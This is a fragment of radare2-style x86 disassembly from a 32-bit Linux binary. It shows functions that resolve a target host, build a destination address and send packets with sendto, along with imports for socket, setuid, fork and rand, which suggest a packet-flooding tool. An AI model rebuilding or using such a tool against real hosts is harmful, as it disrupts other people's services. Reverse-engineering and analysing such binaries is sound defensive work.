mov edx, dword [obj.opensock]
mov dword [var_28h], edx
mov eax, dword [var_28h]
push eax
call sym.imp.sendto
add esp, 0x18
test edi, edi
je 0x8049978
inc esi
dec esi
jmp 0x8049979
lea esi, [esi]
inc esi
jmp 0x8049358
mov esi, esi
lea esp, [var_38h]
pop ebx
pop esi
pop edi
leave
ret
jmp dword [reloc.socket]
jmp dword [reloc.perror]
jmp dword [reloc.getgid]
jmp dword [reloc.setgid]
jmp dword [reloc.getuid]
jmp dword [reloc.setuid]
push ebp
mov ebp, esp
sub esp, 4
push 0x10
push 0
push obj.dstaddr
call sym.imp.memset
add esp, 0xc
mov word [obj.dstaddr], 2
mov eax, dword [obj.target]
push eax
call sym.imp.inet_addr
add esp, 4
mov eax, eax
mov dword [0x804aec4], eax
cmp dword [0x804aec4], 0xffffffff
jne 0x804897f
mov eax, dword [obj.target]
push eax
call sym.imp.gethostbyname
add esp, 4
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048954
mov eax, dword [obj.target]
push eax
push str.___Unable_To_resolve__s_t_n
call sym.imp.printf
add esp, 8
push 1
call sym.imp.exit
add esp, 4
mov eax, dword [var_4h]
mov dx, word [eax + 8]
mov word [obj.dstaddr], dx
mov eax, dword [var_4h]
mov edx, dword [eax + 0xc]
push edx
mov eax, dword [var_4h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
push eax
push 0x804aec4
call sym.imp.memcpy
add esp, 0xc
push 4
push 0x804aec4
push obj.dst
call sym.imp.memcpy
add esp, 0xc
leave
ret
jmp dword [reloc.inet_addr]
jmp dword [reloc.gethostbyname]
jmp dword [reloc.memcpy]
jmp dword [reloc.fork]
jmp dword [reloc.rand]
jmp dword [reloc.htonl]
jmp dword [reloc.sendto]
push ebp
mov ebp, esp
push ebx
call 0x80499c1
pop ebx
add ebx, 0x1373
call loc.gcc2_compiled.
mov ebx, dword [var_4h]
leave
ret
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.getopt]
jmp dword [reloc.atoi]
